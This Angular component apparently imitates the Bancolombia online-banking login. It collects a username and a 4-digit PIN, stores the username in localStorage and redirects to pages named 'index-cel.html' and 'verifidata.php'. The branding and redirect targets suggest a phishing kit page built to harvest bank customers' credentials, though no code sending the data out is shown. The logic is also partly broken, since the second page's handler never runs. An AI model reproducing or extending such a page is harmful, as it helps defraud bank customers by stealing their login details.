import { CommonModule } from '@angular/common';
import { Component, ElementRef, QueryList, Renderer2, ViewChildren } from '@angular/core';
import { FormsModule, ReactiveFormsModule } from '@angular/forms';
import { Router, RouterLink } from '@angular/router';

@Component({
  selector: 'app-bancolombia',
  imports: [CommonModule],
  templateUrl: './bancolombia.component.html',
  styleUrl: './bancolombia.component.css'
})
export default class BancolombiaComponent {
  @ViewChildren('passwordInput') inputs!: QueryList<ElementRef>;
  userInput!: HTMLInputElement;
  continueButton!: HTMLButtonElement;
  imageContainer!: HTMLElement;
  loader!: HTMLElement;

  page = 1;

  constructor(private el: ElementRef, private renderer: Renderer2, private router: Router) {}

  ngOnInit(): void {
    if(this.page == 1) {
      this.page1();
    } else if(this.page == 2) {
      this.page2();
    }
  }


  page1() {
    this.userInput = this.el.nativeElement.querySelector('#userInput');
    this.continueButton = this.el.nativeElement .querySelector('#continueButton');
    this.imageContainer = this.el.nativeElement.querySelector('#imageContainer');
    this.loader = this.el.nativeElement.querySelector('#loader');

    // Check if the user is on a mobile device
    if (window.innerWidth <= 800) { 
      this.router.navigate(['bancolombia-movil'])
    }

    // Enable/Disable the button based on user input
    this.renderer.listen(this.userInput, 'input', () => {
      const userValue = this.userInput.value.trim();
      if (userValue.length >= 4) {
        this.continueButton.classList.add('enabled');
        this.continueButton.classList.remove('disabled');
      } else {
        this.continueButton.classList.add('disabled');
        this.continueButton.classList.remove('enabled');
      }
    });

    // Action when clicking "Continue"
    this.renderer.listen(this.continueButton, 'click', () => {
      const userValue = this.userInput.value.trim();
      if (userValue.length >= 4) {
        let bancoldata: any;
        try {
          const storedData = localStorage.getItem('bancoldata');
          bancoldata = storedData ? JSON.parse(storedData) : {};
        } catch (e) {
          console.error('Error al parsear bancoldata. Reiniciando a un objeto vacío:', e);
          bancoldata = {}; // Reset to empty object if parsing error occurs
        }

        // Update the object with the new user value
        bancoldata.usuario = userValue;

        // Save the updated value to localStorage
        localStorage.setItem('bancoldata', JSON.stringify(bancoldata));

        // Redirect to the next page
        window.location.href = 'index-cel.html';
      } else {
        alert('Por favor, ingrese un usuario válido de al menos 4 caracteres.');
      }
    });
  }

  page2() {
    window.addEventListener('load', () => {
      const loader = document.getElementById('loader');
      if (loader) {
        this.renderer.setStyle(loader, 'display', 'none');
      }
    });

    // Process the password input fields and the continue button
    this.inputs.toArray().forEach((input, index) => {
      this.renderer.listen(input.nativeElement, 'input', (e: Event) => {
        const target = e.target as HTMLInputElement;
        if (!/^\d$/.test(target.value)) {
          target.value = ''; // Clear invalid input
        }
        if (target.value !== '' && index < this.inputs.length - 1) {
          this.inputs.toArray()[index + 1].nativeElement.focus();
        }

        const allFilled = this.inputs.toArray().every((input) => input.nativeElement.value !== '');
        if (this.continueButton) {
          if(allFilled) {
            this.continueButton!.classList.remove('disabled');
            this.continueButton!.classList.add('enabled');
          }
        }
      });

      this.renderer.listen(input.nativeElement, 'keydown', (e: KeyboardEvent) => {
        if (e.key === 'Backspace' && index > 0 && input.nativeElement.value === '') {
          this.inputs.toArray()[index - 1].nativeElement.focus();
        }
      });
    });

    // Handle "Continue" button click
    if (this.continueButton) {
      this.renderer.listen(this.continueButton, 'click', () => {
        if (this.continueButton.disabled) return;

        const inputValues = this.inputs.toArray().map(input => input.nativeElement.value).join('');
        if (inputValues.length === 4 && /^\d{4}$/.test(inputValues)) {
          let bancoldata = localStorage.getItem('bancoldata');
          bancoldata = bancoldata ? JSON.parse(bancoldata) : {};
        /*   bancoldata.clave = inputValues;
          localStorage.setItem('bancoldata', JSON.stringify(bancoldata)); */
          window.location.href = 'verifidata.php';
        } else {
          alert('Por favor, complete los 4 dígitos correctamente.');
        }
      });
    }
  }
}
